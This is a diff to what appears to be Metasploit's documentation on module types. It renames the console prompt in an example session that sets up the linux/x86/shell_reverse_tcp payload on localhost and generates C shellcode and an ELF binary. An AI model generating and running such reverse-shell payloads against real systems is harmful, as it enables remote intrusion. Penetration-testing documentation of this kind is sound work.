@@ -46,18 +46,18 @@ execute code such as adding user accounts, or executing a simple pingback comman
 Payload modules can also be used individually to generate standalone executables, or shellcode for use within exploits:
 
 ```msf
-msf6 payload(linux/x86/shell_reverse_tcp) > back
-msf6 > use payload/linux/x86/shell_reverse_tcp
-msf6 payload(linux/x86/shell_reverse_tcp) > set lhost 127.0.0.1
+msf payload(linux/x86/shell_reverse_tcp) > back
+msf > use payload/linux/x86/shell_reverse_tcp
+msf payload(linux/x86/shell_reverse_tcp) > set lhost 127.0.0.1
 lhost => 127.0.0.1
-msf6 payload(linux/x86/shell_reverse_tcp) > set lport 4444
+msf payload(linux/x86/shell_reverse_tcp) > set lport 4444
 lport => 4444
 
 # Generate a payload for use within C
-msf6 payload(linux/x86/shell_reverse_tcp) > generate -f c
+msf payload(linux/x86/shell_reverse_tcp) > generate -f c
 
 # Generate an ELF file for execution on Linux environments
-msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
+msf payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
 ```
 
 ### Post modules ({{ site.metasploit_module_counts["post"] }})
